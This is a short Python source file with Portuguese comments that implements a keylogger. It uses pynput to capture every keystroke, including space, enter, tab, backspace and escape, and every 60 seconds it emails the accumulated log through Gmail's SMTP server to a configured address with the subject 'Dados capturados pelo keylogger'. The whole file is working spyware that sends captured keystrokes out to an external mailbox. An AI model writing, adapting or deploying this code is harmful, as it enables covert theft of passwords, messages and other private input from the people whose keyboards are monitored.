import smtplib
from pynput import keyboard
from email.mime.text import MIMEText
from threading import Timer

#from keylogger import IGNORAR

log = ""

#configurações de email
EMAIL_ORIGEM = "xxx@gmail.com"
EMAIL_DESTINO= "xxx@gmail.com"
SENHA_EMAIL = "xxxx xxxx xxxx xxxx"

#enviar email
def enviar_email():
    global log
    if log:
        msg = MIMEText(log)
        msg['Subject'] = 'Dados capturados pelo keylogger'
        msg['From'] = EMAIL_ORIGEM
        msg['To'] = EMAIL_DESTINO

        try:
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(EMAIL_ORIGEM, SENHA_EMAIL)
            server.send_message(msg)
            server.quit()
            print("Email enviado com sucesso!")
        except Exception as e:
            print(f"Erro ao enviar email: {e}")
        
        log = ""
    
    Timer(60, enviar_email).start()  #envia a cada 1 minuto
        
def on_press(key):
    global log
    try:
        log += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            log += " "
        elif key == keyboard.Key.enter:
            log += "\n"
        elif key == keyboard.Key.tab:
            log += "\t"
        elif key == keyboard.Key.backspace:
            log += "[<]"
        elif key == keyboard.Key.esc:
            log += "[ESC]"
        else:
            pass

with keyboard.Listener(on_press=on_press) as listener:
    enviar_email()  #inicia o envio de email periódico
    listener.join()
